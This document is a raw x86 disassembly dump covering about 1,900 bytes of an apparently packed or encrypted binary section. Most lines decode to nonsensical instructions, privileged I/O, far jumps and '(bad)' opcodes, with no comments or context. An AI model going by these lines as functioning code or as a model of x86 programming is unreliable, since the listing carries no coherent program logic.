  40caf8:	pop    ds
  40caf9:	add    ebp,DWORD PTR [esi-0x1b]
  40cafc:	sbb    eax,0xd1c2c822
  40cb01:	pop    ecx
  40cb02:	dec    esi
  40cb03:	mov    ch,0x6a
  40cb05:	addr16 pop esp
  40cb07:	fs push ebp
  40cb09:	mov    BYTE PTR ds:0x44b69a7b,ah
  40cb0f:	dec    DWORD PTR [edi-0x35]
  40cb12:	ror    BYTE PTR [edx+0x35e9dd62],1
  40cb18:	in     eax,0x98
  40cb1a:	sahf   
  40cb1b:	sar    DWORD PTR [ecx-0x4c],0x2
  40cb1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb20:	push   0xc7a578eb
  40cb25:	pop    ecx
  40cb26:	mov    ecx,0x2c23299c
  40cb2b:	pop    es
  40cb2c:	pop    esi
  40cb2d:	les    eax,FWORD PTR ss:[edi+0x4c]
  40cb31:	leave  
  40cb32:	retf   0x6f78
  40cb35:	pop    ebp
  40cb36:	mov    ecx,esi
  40cb38:	pusha  
  40cb39:	inc    esi
  40cb3a:	xchg   esi,eax
  40cb3b:	outs   dx,DWORD PTR ds:[esi]
  40cb3c:	mov    edi,0x3c9676d6
  40cb41:	imul   eax,DWORD PTR [ebx],0xffffff87
  40cb44:	inc    eax
  40cb45:	pop    eax
  40cb46:	pop    edx
  40cb47:	aaa    
  40cb48:	test   edx,edi
  40cb4a:	clc    
  40cb4b:	mov    eax,0xc9a8c057
  40cb50:	retf   0xd9ac
  40cb53:	cmp    cl,BYTE PTR [edi-0x529bde0e]
  40cb59:	int    0xa7
  40cb5b:	inc    ecx
  40cb5c:	popa   
  40cb5d:	jae    0x40cb0c
  40cb5f:	jmp    0x95488b96
  40cb64:	mov    cl,0xf
  40cb66:	jmp    FWORD PTR [eax-0x2d]
  40cb69:	arpl   WORD PTR [edx],sp
  40cb6b:	pop    ds
  40cb6c:	push   0xcae43aab
  40cb71:	dec    edi
  40cb72:	stc    
  40cb73:	sub    BYTE PTR [ecx+0x3d16a879],ch
  40cb79:	inc    esp
  40cb7a:	push   cs
  40cb7b:	and    cl,BYTE PTR [ecx+ebx*4]
  40cb7e:	enter  0x7304,0x19
  40cb82:	jne    0x40cb0e
  40cb84:	xchg   esp,eax
  40cb85:	xor    DWORD PTR [edi+0x2a102c57],ebp
  40cb8b:	mov    DWORD PTR [esi+0x59582750],ecx
  40cb91:	retf   
  40cb92:	enter  0x2ad,0x6f
  40cb96:	pop    es
  40cb97:	or     DWORD PTR [esi+eiz*2-0x1b],edx
  40cb9b:	mov    ah,0x3f
  40cb9d:	or     al,bl
  40cb9f:	push   ebx
  40cba0:	aas    
  40cba1:	push   edi
  40cba2:	mov    DWORD PTR [ebx+eax*4-0x15ac46e],edi
  40cba9:	lea    esi,[ecx+0x2c0f8e81]
  40cbaf:	hlt    
  40cbb0:	mov    DWORD PTR [ebp-0x2c],ecx
  40cbb3:	mov    al,ds:0xbec37cd0
  40cbb8:	loopne 0x40cbf0
  40cbba:	(bad)  
  40cbbb:	jge    0x40cc34
  40cbbd:	jle    0x40cbc2
  40cbbf:	dec    ebp
  40cbc0:	cmova  ecx,DWORD PTR [ecx-0x23fa4786]
  40cbc7:	or     BYTE PTR [edi+0x43],0x73
  40cbcb:	(bad)  
  40cbcc:	cmp    DWORD PTR [edi-0x1d],esp
  40cbcf:	lds    ebx,FWORD PTR [ebp+0x1c]
  40cbd2:	(bad)
  40cbd5:	pop    esp
  40cbd6:	dec    ecx
  40cbd7:	cli    
  40cbd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbda:	jl     0x40cbfb
  40cbdc:	int    0x7b
  40cbde:	dec    ebp
  40cbdf:	vcvtsd2ss xmm5,xmm2,QWORD PTR [edi]
  40cbe3:	cmp    BYTE PTR [esi-0x65bdacd3],dl
  40cbe9:	das    
  40cbea:	addr16 pop ebp
  40cbec:	enter  0x1dde,0xeb
  40cbf0:	lods   eax,DWORD PTR ds:[esi]
  40cbf1:	call   0x3404:0x5c799019
  40cbf8:	int    0x46
  40cbfa:	(bad)  
  40cbfc:	es adc ecx,esp
  40cbff:	jecxz  0x40cc3d
  40cc01:	sti    
  40cc02:	jmp    0x457c:0x4d257755
  40cc09:	sti    
  40cc0a:	int3   
  40cc0b:	pop    edi
  40cc0c:	call   0x6210:0x671b9d1a
  40cc13:	sub    al,0x6a
  40cc15:	jmp    0x9bb9:0x506189e
  40cc1c:	push   cs
  40cc1d:	inc    esi
  40cc1e:	rol    DWORD PTR [edx+0x78fdbc1a],0x71
  40cc25:	or     cl,ch
  40cc27:	ins    BYTE PTR es:[edi],dx
  40cc28:	pop    ss
  40cc29:	lods   eax,DWORD PTR ds:[esi]
  40cc2a:	fbld   TBYTE PTR [esi-0x6e42b928]
  40cc30:	adc    eax,0x38dc6cad
  40cc35:	pop    edi
  40cc36:	mov    DWORD PTR [edx+0x1f],esi
  40cc39:	jg     0x40cbe8
  40cc3b:	xor    BYTE PTR [eax+eiz*8],ah
  40cc3e:	fld    TBYTE PTR [edx]
  40cc40:	inc    eax
  40cc41:	mov    ecx,0xa392023b
  40cc46:	out    dx,al
  40cc47:	scas   eax,DWORD PTR es:[edi]
  40cc48:	fwait
  40cc49:	(bad)  
  40cc4a:	mov    cl,0x30
  40cc4c:	rep ins BYTE PTR es:[edi],dx
  40cc4e:	add    DWORD PTR [edx+0x2e4b9b79],esp
  40cc54:	scas   eax,DWORD PTR es:[edi]
  40cc55:	mov    ebp,0xa3cc2b3a
  40cc5a:	pop    esi
  40cc5b:	sbb    eax,0xc83a5447
  40cc60:	mov    al,ds:0x6002334d
  40cc65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc66:	stc    
  40cc67:	std    
  40cc68:	mov    BYTE PTR [esi+edx*4-0x3590e148],cl
  40cc6f:	mov    ebp,DWORD PTR [ebx+eiz*4]
  40cc72:	mov    al,ds:0x53f4f86d
  40cc77:	cs aaa 
  40cc79:	push   esi
  40cc7a:	test   al,0x8b
  40cc7c:	mov    eax,DWORD PTR [esi+ebp*2]
  40cc7f:	pushf  
  40cc80:	jmp    0xc112:0xc49c3bdf
  40cc87:	add    eax,0xe76cecbe
  40cc8c:	inc    eax
  40cc8d:	mov    ecx,0x10163ac6
  40cc92:	in     al,dx
  40cc93:	repnz aaa 
  40cc95:	adc    DWORD PTR [eax-0x70dca860],esi
  40cc9b:	and    al,0x48
  40cc9d:	(bad)  
  40cc9f:	cwde   
  40cca0:	jnp    0x40cca1
  40cca2:	dec    BYTE PTR [eax+0x9]
  40cca5:	lea    edi,[eax]
  40cca7:	ins    BYTE PTR es:[edi],dx
  40cca8:	xchg   esp,eax
  40cca9:	popf   
  40ccaa:	leave  
  40ccab:	int    0x8
  40ccad:	(bad)  
  40ccaf:	push   esp
  40ccb0:	mov    esp,0xe411d6c2
  40ccb5:	int3   
  40ccb6:	mov    bh,0x47
  40ccb8:	repz (bad) 
  40ccbb:	or     al,0x63
  40ccbd:	mov    cl,0xfc
  40ccbf:	mov    edx,ebp
  40ccc1:	adc    al,0x31
  40ccc3:	add    eax,0x3cc7b95d
  40ccc8:	xchg   ecx,eax
  40ccc9:	repz jmp 0x40cc75
  40cccc:	sar    DWORD PTR [edx],0x1f
  40cccf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccd0:	pushf  
  40ccd1:	and    DWORD PTR [eax+ebx*1-0x6b04f400],0xd503ff9
  40ccdc:	imul   esi,DWORD PTR [edx+0x2a],0xffffffcc
  40cce0:	pop    ebp
  40cce1:	jmp    0x7b25398
  40cce6:	cmp    al,0x6
  40cce8:	jge    0x40cd44
  40ccea:	jo     0x40cd2d
  40ccec:	outs   dx,BYTE PTR fs:[esi]
  40ccee:	mov    eax,ds:0x166624f7
  40ccf3:	mov    ah,BYTE PTR [edi+0x79d98bb8]
  40ccf9:	out    dx,al
  40ccfa:	sti    
  40ccfb:	test   BYTE PTR [esi+eiz*8+0x1],ch
  40ccff:	push   ecx
  40cd00:	xchg   esp,eax
  40cd01:	(bad)
  40cd04:	in     al,dx
  40cd05:	or     eax,ebx
  40cd07:	mov    eax,0xe72437bd
  40cd0c:	adc    dh,BYTE PTR [ebx+0x59]
  40cd0f:	retf   0x5fbb
  40cd12:	imul   esp,DWORD PTR [esi-0x6440b2fa],0x79
  40cd19:	push   ss
  40cd1a:	stos   DWORD PTR es:[edi],eax
  40cd1b:	fst    QWORD PTR [eax+0x21fa6494]
  40cd21:	sub    DWORD PTR [ebx+ecx*1+0x3427cff0],edx
  40cd28:	xchg   esi,eax
  40cd29:	int3   
  40cd2a:	mov    ecx,0xd0e3cc5b
  40cd2f:	add    DWORD PTR [eax-0x4aa23642],edi
  40cd35:	aas    
  40cd36:	gs and al,0x19
  40cd39:	pop    edx
  40cd3a:	jge    0x40ccdd
  40cd3c:	popa   
  40cd3d:	sub    al,0x86
  40cd3f:	clc    
  40cd40:	adc    bl,BYTE PTR [ebp-0x1bb33ee1]
  40cd46:	mov    DWORD PTR [eax],esp
  40cd48:	loop   0x40cd67
  40cd4a:	and    eax,0xe6bdecd6
  40cd4f:	or     eax,0x4f2dd8ef
  40cd54:	jecxz  0x40cdcf
  40cd56:	mov    DWORD PTR [ecx],ebp
  40cd58:	push   esi
  40cd59:	outs   dx,BYTE PTR ds:[esi]
  40cd5a:	cld    
  40cd5b:	jae    0x40cdb5
  40cd5d:	cld    
  40cd5e:	fxch   st(6)
  40cd60:	fstp   DWORD PTR [edx+0x3a31f3fd]
  40cd66:	mov    ds:0x214cb98,eax
  40cd6b:	lods   al,BYTE PTR ds:[esi]
  40cd6d:	fbld   TBYTE PTR [ecx-0x60723c47]
  40cd73:	scas   eax,DWORD PTR es:[edi]
  40cd74:	pushf  
  40cd75:	popf   
  40cd76:	dec    ebp
  40cd77:	outs   dx,BYTE PTR ds:[esi]
  40cd78:	lods   al,BYTE PTR ds:[esi]
  40cd79:	mov    BYTE PTR [eax+edx*2-0x64],bl
  40cd7d:	mov    ah,0x16
  40cd7f:	fmul   QWORD PTR [eax]
  40cd81:	in     al,dx
  40cd82:	pop    ebx
  40cd83:	push   0xffffffe1
  40cd85:	dec    esi
  40cd86:	in     eax,0x28
  40cd88:	mov    ds:0x22178db8,al
  40cd8d:	in     al,0x50
  40cd8f:	pop    ecx
  40cd90:	xchg   ebp,eax
  40cd91:	js     0x40cdba
  40cd93:	out    dx,al
  40cd94:	test   al,0xff
  40cd96:	push   esp
  40cd97:	xchg   edx,eax
  40cd98:	xlat   BYTE PTR ds:[ebx]
  40cd99:	and    ebp,DWORD PTR [esi+0x28]
  40cd9c:	add    al,0x69
  40cd9e:	push   esp
  40cd9f:	lods   eax,DWORD PTR ds:[esi]
  40cda0:	iret   
  40cda1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cda2:	les    esp,FWORD PTR [ecx]
  40cda4:	sub    al,BYTE PTR [ebx]
  40cda6:	cmp    BYTE PTR [edi-0x3f],dh
  40cda9:	push   ebp
  40cdaa:	mov    esi,gs
  40cdac:	sbb    BYTE PTR ds:0xb432089b,0xe0
  40cdb3:	out    0xb2,eax
  40cdb5:	mov    eax,ds:0x23635440
  40cdba:	xchg   ebx,eax
  40cdbb:	pop    edx
  40cdbc:	jno    0x40cd65
  40cdbe:	and    bl,BYTE PTR [ecx+0x6e2a46a2]
  40cdc4:	pushf  
  40cdc5:	mov    ds:0x3cc69284,al
  40cdca:	popf   
  40cdcb:	dec    ebx
  40cdcc:	jnp    0x40cd8e
  40cdce:	mov    ecx,0x4b7656f8
  40cdd3:	and    al,0x1
  40cdd5:	pop    ss
  40cdd6:	aam    0x31
  40cdd8:	ror    DWORD PTR [eax],0x7e
  40cddb:	fnsave [esp+edi*8+0x11]
  40cddf:	stc    
  40cde0:	sbb    ebx,edx
  40cde2:	cmp    eax,0x4e124990
  40cde7:	inc    bl
  40cde9:	out    dx,al
  40cdea:	lea    esp,[ebp-0x60]
  40cded:	xor    bh,BYTE PTR [edx+0x67e9bc8d]
  40cdf3:	mov    BYTE PTR [eax],dl
  40cdf5:	add    DWORD PTR [edi-0x9],0xd0db7952
  40cdfc:	cld    
  40cdfd:	sbb    eax,0x84a3a3f3
  40ce02:	fwait
  40ce03:	sar    DWORD PTR [esi],cl
  40ce05:	sub    eax,DWORD PTR [ebx-0x1b867b96]
  40ce0b:	xchg   ebp,eax
  40ce0c:	mov    dl,0xc2
  40ce0e:	addr16 sbb al,0xf7
  40ce11:	(bad)  
  40ce12:	lods   al,BYTE PTR ds:[esi]
  40ce13:	xchg   esi,eax
  40ce14:	push   ebp
  40ce15:	adc    BYTE PTR [ebx],dh
  40ce17:	xchg   edx,eax
  40ce18:	and    ebp,DWORD PTR [edi+0x27d6f6d6]
  40ce1e:	add    DWORD PTR [ebp-0x3e],ecx
  40ce21:	mov    al,ds:0xa0e7eec9
  40ce26:	enter  0xcc0d,0x3f
  40ce2a:	retf   0xcbb7
  40ce2d:	jmp    0x8e2be009
  40ce32:	xor    esp,ecx
  40ce34:	lods   al,BYTE PTR ds:[esi]
  40ce35:	or     esp,edi
  40ce37:	push   edi
  40ce38:	pop    ss
  40ce39:	fs fs sahf 
  40ce3c:	int3   
  40ce3d:	imul   DWORD PTR ds:[edi-0x2f98dd25]
  40ce44:	sub    dh,dh
  40ce46:	das    
  40ce47:	add    al,BYTE PTR [ecx+0x3ebc1edc]
  40ce4d:	cmp    ecx,DWORD PTR [edi+ebp*2-0x32]
  40ce51:	retf   
  40ce52:	shr    DWORD PTR [esi+0x50],cl
  40ce55:	ror    DWORD PTR [esi-0x438c7eb3],1
  40ce5b:	imul   BYTE PTR ds:0xbd2c96a8
  40ce61:	ds pop ebp
  40ce63:	hlt    
  40ce64:	sub    cl,BYTE PTR [edi-0x9311df8]
  40ce6a:	imul   eax,DWORD PTR [eax+0x43],0x2c079a15
  40ce71:	mov    edi,0xa2194f7b
  40ce76:	or     eax,0x721cf21e
  40ce7b:	cld    
  40ce7c:	mov    eax,0x4e299e3
  40ce81:	add    ch,BYTE PTR fs:[esi]
  40ce84:	pop    ss
  40ce85:	push   esp
  40ce86:	sub    edx,DWORD PTR [esi-0xf42b32d]
  40ce8c:	fidivr WORD PTR [esp+ecx*8+0x4b]
  40ce90:	int3   
  40ce91:	xor    eax,0xf2f71dd4
  40ce96:	pop    ebp
  40ce97:	loop   0x40ce2a
  40ce99:	test   DWORD PTR [edi+eiz*1],esi
  40ce9c:	(bad)  
  40ce9d:	lods   al,BYTE PTR ds:[esi]
  40ce9e:	mov    edi,DWORD PTR [ebx+ebx*1+0x4a39bb28]
  40cea5:	sub    ebp,esp
  40cea7:	cli    
  40cea8:	scas   al,BYTE PTR es:[edi]
  40cea9:	sbb    ch,BYTE PTR [eax-0x71]
  40ceac:	sub    esi,DWORD PTR [eax-0x44]
  40ceaf:	out    dx,eax
  40ceb0:	in     al,dx
  40ceb1:	jb     0x40ce79
  40ceb3:	repnz sub al,BYTE PTR [edx]
  40ceb6:	daa    
  40ceb7:	test   bl,0x26
  40ceba:	push   cs
  40cebb:	xchg   edx,eax
  40cebc:	jns    0x40ce7c
  40cebe:	sbb    al,0x72
  40cec0:	das    
  40cec1:	push   0x9
  40cec3:	jo     0x40ce95
  40cec5:	mov    ch,0xc1
  40cec7:	loope  0x40ce54
  40cec9:	stos   BYTE PTR es:[edi],al
  40ceca:	xchg   esi,eax
  40cecb:	add    al,0xaa
  40cecd:	jmp    0x40cea4
  40cecf:	imul   esi,ebp,0xf036f567
  40ced5:	cwde   
  40ced6:	mov    bh,0xeb
  40ced8:	nop
  40ced9:	sub    al,0x5b
  40cedb:	bound  esi,QWORD PTR [eax]
  40cedd:	xor    ebp,edx
  40cedf:	push   ebp
  40cee0:	adc    ch,BYTE PTR [edi+0xfbd7949]
  40cee6:	sub    eax,0x35b98561
  40ceeb:	or     BYTE PTR [esp+ebx*8+0xf0e1805],ch
  40cef2:	xchg   BYTE PTR [ecx],bh
  40cef4:	pop    esi
  40cef5:	add    al,0xfc
  40cef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cef8:	(bad)  
  40cefa:	push   ebx
  40cefb:	jmp    0x40ce8d
  40cefd:	mov    cl,0x30
  40ceff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf00:	test   al,0xac
  40cf02:	jecxz  0x40cf5e
  40cf04:	push   eax
  40cf05:	add    al,0x9d
  40cf07:	mov    ch,0x8e
  40cf09:	and    al,BYTE PTR [edx]
  40cf0b:	in     al,dx
  40cf0c:	sbb    al,BYTE PTR [ecx+ebx*8-0x7a]
  40cf10:	scas   al,BYTE PTR es:[edi]
  40cf11:	xor    al,0xa8
  40cf13:	jo     0x40cf57
  40cf15:	jl     0x40ceeb
  40cf17:	or     al,0xd3
  40cf19:	nop
  40cf1a:	or     bh,BYTE PTR [edi]
  40cf1c:	sbb    BYTE PTR [eax+0x7b992a9d],ah
  40cf22:	and    dh,BYTE PTR [eax+0x61638f46]
  40cf28:	retf   
  40cf29:	jb     0x40cf5d
  40cf2b:	mov    al,ds:0xe6b7b428
  40cf30:	in     eax,0xf1
  40cf32:	inc    esi
  40cf33:	lods   eax,DWORD PTR ds:[esi]
  40cf34:	dec    eax
  40cf35:	push   ecx
  40cf36:	pop    ecx
  40cf37:	inc    edx
  40cf38:	cwde   
  40cf39:	pop    ebx
  40cf3a:	dec    esp
  40cf3b:	leave  
  40cf3c:	push   0x10
  40cf3e:	push   eax
  40cf3f:	push   edx
  40cf40:	(bad)  
  40cf41:	test   DWORD PTR [edx-0x6d],edi
  40cf44:	mov    BYTE PTR [esi+0x6722748e],cl
  40cf4a:	popa   
  40cf4b:	ret    0x7de9
  40cf4e:	test   esp,edi
  40cf50:	cmp    bh,BYTE PTR [ebp-0x79d6d452]
  40cf56:	hlt    
  40cf57:	rcl    ch,1
  40cf59:	adc    al,0xe4
  40cf5b:	retf   
  40cf5c:	mov    al,ds:0x8e018863
  40cf61:	cmp    esp,DWORD PTR [edx-0x4d]
  40cf64:	push   0xe75bf0f
  40cf69:	jmp    0xd7a5:0x49424a73
  40cf70:	xchg   esp,eax
  40cf71:	jg     0x40cf21
  40cf73:	mov    esp,0x2d25c13a
  40cf78:	xchg   esi,eax
  40cf79:	ins    DWORD PTR es:[edi],dx
  40cf7a:	add    edx,ecx
  40cf7c:	xor    edx,ebx
  40cf7e:	mov    ebx,DWORD PTR ds:0x434014
  40cf84:	or     DWORD PTR ds:0x436018,ebx
  40cf8a:	mov    DWORD PTR [ebp-0x50],edx
  40cf8d:	mov    edx,DWORD PTR [ebp+0x8]
  40cf90:	mov    ebx,DWORD PTR ds:0x434020
  40cf96:	sbb    DWORD PTR ds:0x43401c,ebx
  40cf9c:	mov    ebx,DWORD PTR [ebp-0x4c]
  40cf9f:	jmp    0x40f353
  40cfa4:	mov    DWORD PTR [edi+0x2c],0x73f3ac7a
  40cfab:	ret    
  40cfac:	xchg   esp,eax
  40cfad:	cs or  al,0xd2
  40cfb0:	test   BYTE PTR [edi],dh
  40cfb2:	xchg   BYTE PTR [edi+0x7c7ce265],dh
  40cfb8:	jmp    0x40d019
  40cfba:	jl     0x40d038
  40cfbc:	cdq    
  40cfbd:	(bad)  
  40cfbe:	xor    bl,ah
  40cfc0:	lea    eax,[edx]
  40cfc2:	mov    ah,ch
  40cfc4:	ds ja  0x40d010
  40cfc7:	xchg   esp,eax
  40cfc8:	mov    edi,0x76fd317e
  40cfcd:	fistp  DWORD PTR ds:0xc99aff4e
  40cfd3:	les    ebp,FWORD PTR [esi]
  40cfd5:	jbe    0x40cfbe
  40cfd7:	clc    
  40cfd8:	pop    ds
  40cfd9:	adc    al,0x4f
  40cfdb:	in     eax,0xde
  40cfdd:	out    dx,al
  40cfde:	xchg   esi,eax
  40cfdf:	ret    
  40cfe0:	push   esi
  40cfe1:	stos   DWORD PTR es:[edi],eax
  40cfe2:	lods   al,BYTE PTR ds:[esi]
  40cfe3:	addr16 cld 
  40cfe5:	sbb    ecx,DWORD PTR [edi+0x4a63ebfc]
  40cfeb:	cs xchg edi,eax
  40cfed:	dec    ecx
  40cfee:	add    DWORD PTR [esi-0xca2bc8a],0x9f7f751c
  40cff8:	idiv   BYTE PTR [edx-0xd]
  40cffb:	fcmovbe st,st(7)
  40cffd:	and    al,0x5
  40cfff:	sbb    DWORD PTR [edx+0x38de243],eax
  40d005:	retf   
  40d006:	sub    DWORD PTR ds:0xa4f6b079,esp
  40d00c:	gs xchg ecx,eax
  40d00e:	cmp    edi,DWORD PTR [ebx+ebx*2+0x3aabb50c]
  40d015:	cwde   
  40d016:	int    0x1f
  40d018:	aas    
  40d019:	dec    edx
  40d01a:	sub    eax,0x262523dc
  40d01f:	shl    DWORD PTR ds:0x61dc6ab0,1
  40d025:	sbb    al,0xef
  40d027:	iret   
  40d028:	stos   DWORD PTR es:[edi],eax
  40d029:	pop    ss
  40d02a:	sbb    ah,BYTE PTR [edx-0x6de298b5]
  40d030:	int3   
  40d031:	jo     0x40d065
  40d033:	(bad)  
  40d034:	jo     0x40cfd4
  40d036:	jb     0x40d00a
  40d038:	icebp  
  40d039:	and    DWORD PTR [edi-0x31],ecx
  40d03c:	fild   QWORD PTR [esi-0x7f5fa025]
  40d042:	xchg   esi,eax
  40d043:	xchg   esp,eax
  40d044:	retf   
  40d045:	ins    BYTE PTR es:[edi],dx
  40d046:	gs (bad) 
  40d048:	jnp    0x40d0a3
  40d04a:	pop    esp
  40d04b:	sbb    ebp,DWORD PTR [edx+0xea070bc]
  40d051:	sbb    DWORD PTR [ebp+0x6724888],esi
  40d057:	and    dh,ah
  40d059:	psubsb mm7,QWORD PTR [esi+0x68f28dff]
  40d060:	in     eax,dx
  40d061:	fimul  WORD PTR [ebx-0x52]
  40d064:	sti    
  40d065:	jnp    0x40d06b
  40d067:	in     al,0x60
  40d069:	aam    0x41
  40d06b:	push   ds
  40d06c:	test   al,dh
  40d06e:	sbb    bl,BYTE PTR [edx+ecx*8]
  40d071:	xchg   BYTE PTR [eax-0x2],ah
  40d074:	shr    ecx,cl
  40d076:	xchg   ecx,eax
  40d077:	push   0xffffff8b
  40d079:	das    
  40d07a:	jecxz  0x40d072
  40d07c:	mov    ds:0x26299a1a,eax
  40d081:	push   edx
  40d082:	push   0xbe1bda4
  40d087:	xor    ebp,DWORD PTR [eax]
  40d089:	stc    
  40d08a:	add    eax,0x2d041db6
  40d08f:	out    0x96,al
  40d091:	adc    bl,BYTE PTR ds:0xa18a6d98
  40d097:	ins    BYTE PTR es:[edi],dx
  40d098:	iret   
  40d099:	push   cs
  40d09a:	dec    edi
  40d09b:	ja     0x40d09b
  40d09d:	(bad)  
  40d09e:	repnz or BYTE PTR [esi-0x56],dl
  40d0a2:	dec    esi
  40d0a3:	sub    al,0xa
  40d0a5:	popf   
  40d0a6:	rol    BYTE PTR [eax+0x56],cl
  40d0a9:	and    BYTE PTR [ebx+0x1c],bh
  40d0ac:	or     BYTE PTR [ebp+0x1f0600a9],ah
  40d0b2:	xchg   bh,bl
  40d0b4:	mov    dl,BYTE PTR [edx+0x5d366abc]
  40d0ba:	ss push ebp
  40d0bc:	std    
  40d0bd:	mov    edi,DWORD PTR [edi]
  40d0bf:	push   ss
  40d0c0:	cmova  ecx,DWORD PTR [ebp-0x5d46c2e9]
  40d0c7:	inc    edx
  40d0c8:	aaa    
  40d0c9:	and    eax,0x64fc2a03
  40d0ce:	int3   
  40d0cf:	out    0x78,eax
  40d0d1:	test   BYTE PTR [ecx],ch
  40d0d3:	and    ebx,DWORD PTR [ebx-0x55]
  40d0d6:	cmp    DWORD PTR [ebx+eiz*2-0x80],ebx
  40d0da:	and    eax,0x5402dbe5
  40d0df:	data16 retw 
  40d0e2:	cwde   
  40d0e3:	into   
  40d0e4:	call   0x130e:0xfd9df9aa
  40d0eb:	xchg   BYTE PTR [edx-0xb5cd109],bl
  40d0f1:	addr16 retf 
  40d0f3:	or     DWORD PTR [esi+ebx*1-0x5d],edi
  40d0f7:	ret    
  40d0f8:	mov    eax,0x190734f
  40d0fd:	inc    edx
  40d0fe:	xchg   edi,eax
  40d0ff:	call   0x82d9:0x7881e298
  40d106:	pop    edi
  40d107:	stos   DWORD PTR es:[edi],eax
  40d108:	mov    gs,ecx
  40d10a:	dec    ecx
  40d10b:	xchg   al,ch
  40d10d:	jmp    0xb6d:0xfe225c59
  40d114:	mov    ebx,0x916257a0
  40d119:	cmp    BYTE PTR [edi],dl
  40d11b:	popf   
  40d11c:	cmp    eax,0x7a617a28
  40d121:	mov    ds:0x83dd7872,eax
  40d126:	mov    al,0x2e
  40d128:	mov    al,0x70
  40d12a:	fwait
  40d12b:	pop    esp
  40d12c:	icebp  
  40d12d:	les    edx,FWORD PTR [esp+eax*2]
  40d130:	pop    ebp
  40d131:	into   
  40d132:	push   ebp
  40d133:	out    dx,eax
  40d134:	repnz sbb BYTE PTR [ecx],al
  40d137:	dec    edx
  40d138:	xchg   esp,eax
  40d139:	sub    ebp,DWORD PTR [eax+0x5]
  40d13c:	inc    esi
  40d13d:	cmp    ah,al
  40d13f:	dec    esp
  40d140:	jnp    0x40d155
  40d142:	mov    edx,0xf6862379
  40d147:	stos   BYTE PTR es:[edi],al
  40d148:	cdq    
  40d149:	jb     0x40d199
  40d14b:	adc    ch,BYTE PTR [esi]
  40d14d:	mov    ecx,0x63c36135
  40d152:	pop    eax
  40d153:	aam    0xe5
  40d155:	or     eax,0x343d0f63
  40d15a:	jne    0x40d1d5
  40d15c:	dec    eax
  40d15d:	js     0x40d184
  40d15f:	test   BYTE PTR [ebx+0x3892ef54],ch
  40d165:	and    al,0x61
  40d167:	pop    esp
  40d168:	fwait
  40d169:	addr16 out 0x84,eax
  40d16c:	pushf  
  40d16d:	ins    BYTE PTR es:[edi],dx
  40d16e:	call   0xd8314d01
  40d173:	add    BYTE PTR [edx-0x35],ah
  40d176:	lods   eax,DWORD PTR ds:[esi]
  40d177:	push   0x16
  40d179:	push   ss
  40d17a:	lea    eax,[edx]
  40d17c:	gs inc esi
  40d17e:	hlt    
  40d17f:	or     al,0x70
  40d181:	out    0xef,eax
  40d183:	lods   al,BYTE PTR ds:[esi]
  40d184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d185:	scas   al,BYTE PTR es:[edi]
  40d186:	mov    dh,0xb8
  40d188:	les    ebx,FWORD PTR [eax-0x3d]
  40d18b:	cdq    
  40d18c:	inc    esp
  40d18d:	adc    cl,BYTE PTR [edi+0x31b8eab6]
  40d193:	(bad)  
  40d194:	jo     0x40d190
  40d196:	inc    eax
  40d197:	aaa    
  40d198:	ret    0x3388
  40d19b:	dec    ebp
  40d19c:	push   edx
  40d19d:	or     ah,BYTE PTR [esp+eax*2+0x6c]
  40d1a1:	jae    0x40d129
  40d1a3:	or     ebx,DWORD PTR [edi]
  40d1a5:	and    al,0xf0
  40d1a7:	icebp  
  40d1a8:	or     al,0x35
  40d1aa:	fcom   QWORD PTR [edx]
  40d1ac:	push   edi
  40d1ad:	pop    esi
  40d1ae:	lds    edi,FWORD PTR [ebx+0x7137ecd]
  40d1b4:	out    dx,al
  40d1b5:	call   0xaaa1:0x6c0e90c8
  40d1bc:	inc    ebx
  40d1bd:	stos   DWORD PTR es:[edi],eax
  40d1be:	mov    cl,0xf8
  40d1c0:	mov    ds:0xcb3dfc95,eax
  40d1c5:	scas   eax,DWORD PTR es:[edi]
  40d1c6:	or     edx,DWORD PTR [ecx+0x5dbdaa4e]
  40d1cc:	loopne 0x40d155
  40d1ce:	pop    ss
  40d1cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1d0:	or     ch,BYTE PTR [ebp+0xeda0d34]
  40d1d6:	pop    es
  40d1d7:	inc    ecx
  40d1d8:	push   ebp
  40d1d9:	sbb    al,0x8e
  40d1db:	jge    0x40d192
  40d1dd:	xlat   BYTE PTR ds:[ebx]
  40d1de:	ins    DWORD PTR es:[edi],dx
  40d1df:	es int 0xf0
  40d1e2:	xor    al,0x72
  40d1e4:	adc    DWORD PTR [ebp+0x302ca253],edi
  40d1ea:	mov    BYTE PTR [ecx-0x27],0x65
  40d1ee:	adc    DWORD PTR [ecx+0x72dc530],eax
  40d1f4:	and    esp,DWORD PTR [edx-0x44]
  40d1f7:	cmc    
  40d1f8:	mov    al,ds:0x80f192da
  40d1fd:	inc    esi
  40d1fe:	and    DWORD PTR [eax+0x59],edi
  40d201:	(bad)  
  40d202:	mov    WORD PTR [ebp+0x4b],?
  40d205:	cmp    BYTE PTR [edx],bl
  40d207:	sbb    al,0x4e
  40d20a:	pop    edi
  40d20b:	mov    cl,0xb0
  40d20d:	ss mov ecx,0xc60fd1e4
  40d213:	push   edx
  40d214:	loope  0x40d22e
  40d216:	mov    edx,0x2b1f6bc0
  40d21b:	shl    DWORD PTR [esi-0x80],0x51
  40d21f:	adc    ch,bl
  40d221:	xchg   DWORD PTR [edi-0x24],eax
  40d224:	cmp    eax,0x5ff01443
  40d229:	mov    ch,0x11
  40d22b:	loope  0x40d1ad
  40d22d:	jne    0x40d1ca
  40d22f:	out    dx,eax
  40d230:	icebp  
  40d231:	mov    eax,ds:0xf5a22dbf
  40d236:	and    esp,DWORD PTR [ebp-0x4e89bb]
  40d23c:	inc    ecx
  40d23d:	test   DWORD PTR [eax],ebp
  40d23f:	repnz sahf 
  40d241:	or     edi,DWORD PTR [edi]
  40d243:	push   edx
  40d244:	add    DWORD PTR [esi+0x66],edx
  40d247:	mov    esp,0x518cfed2
  40d24c:	popf   
  40d24d:	ja     0x40d2c6
  40d24f:	sbb    ebp,DWORD PTR [eax]
